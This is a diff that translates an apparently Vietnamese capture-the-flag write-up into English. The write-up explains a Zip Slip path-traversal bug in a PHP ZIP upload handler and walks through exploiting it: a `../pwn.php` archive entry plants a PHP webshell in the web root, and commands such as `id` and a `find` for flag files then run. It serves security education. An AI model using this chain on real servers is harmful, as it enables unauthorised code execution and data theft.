@@ -9,9 +9,9 @@ pinned: false
 draft: false
 ---
 
-### Phân tích file
+### File analysis
 
-Trong file `upload.php`, phần xử lý upload ZIP có logic dạng:
+In `upload.php`, the ZIP upload handling has logic like:
 
 ```php
 $uploadDir = __DIR__ . '/uploads/';
@@ -19,45 +19,45 @@ $uploadDir = __DIR__ . '/uploads/';
 $zipper->make($destination)->extractTo($uploadDir);
 ```
 
-Ý tưởng của server là:
+The server's idea is:
 
-1. Người dùng upload một file ZIP.
-2. Server lưu file ZIP lại.
-3. Server extract nội dung ZIP vào thư mục `uploads/`.
+1. The user uploads a ZIP file.
+2. The server saves the ZIP file.
+3. The server extracts the ZIP contents into the `uploads/` directory.
 
-Nếu trong file ZIP có một entry tên là:
+If the ZIP file contains an entry named:
 
 ```text
 ../pwn.php
 ```
 
-thì khi extract vào:
+then when extracted into:
 
 ```text
 /var/www/html/uploads/
 ```
 
-đường dẫn thực tế sẽ trở thành:
+the actual path becomes:
 
 ```text
 /var/www/html/uploads/../pwn.php
 ```
 
-Sau khi normalize path, nó tương đương với:
+After normalizing the path, it is equivalent to:
 
 ```text
 /var/www/html/pwn.php
 ```
 
-Tức là attacker có thể ghi file ra ngoài thư mục `uploads/`, cụ thể là ghi PHP webshell vào web root.
+That is, the attacker can write a file outside the `uploads/` directory — specifically, write a PHP webshell into the web root.
 
-Đây là lỗi **Zip Slip / Path Traversal during archive extraction**.
+This is a **Zip Slip / Path Traversal during archive extraction** bug.
 
-### Tạo payload ZIP
+### Creating the ZIP payload
 
-Ta không upload PHP trực tiếp. Thay vào đó, ta tạo một file ZIP có chứa PHP shell.
+We don't upload PHP directly. Instead, we create a ZIP file containing a PHP shell.
 
-Tạo file `pwn.php` và nén vào zip:
+Create a `pwn.php` file and zip it:
 
 ```php
 <?php
@@ -68,37 +68,37 @@ echo "</pre>";
 ?>
 ```
 
-Upload file zip đó:
+Upload that zip file:
 
 ![](./image.png)
 
-Upload và truy cập webshell vừa ghi ra:
+Upload and access the webshell that was just written out:
 
 ```text
 /pwn.php?cmd=id
 ```
 
-Kết quả:
+Result:
 
 ![](./image-1.png)
 
-Vậy ta đã thực thi được lệnh hệ thống trên server với quyền user `www-data`.
+So we have executed a system command on the server with the `www-data` user privileges.
 
-Tới đây, lỗ hổng đã được khai thác thành công thành **Remote Code Execution**.
+At this point, the vulnerability has been successfully exploited into **Remote Code Execution**.
 
-### Tìm vị trí flag
+### Finding the flag location
 
-Dùng lệnh `find` để tìm file có tên chứa `flag`:
+Use the `find` command to look for files whose name contains `flag`:
 
 ```text
 cmd = find / -name "*flag*" 2>/dev/null
 ```
 
-Kết quả 
+Result
 
 ![](./image-2.png)
 
-Đọc file `/var/www/html/flag.txt`:
+Read the file `/var/www/html/flag.txt`:
 
 ![](./image-3.png)
 
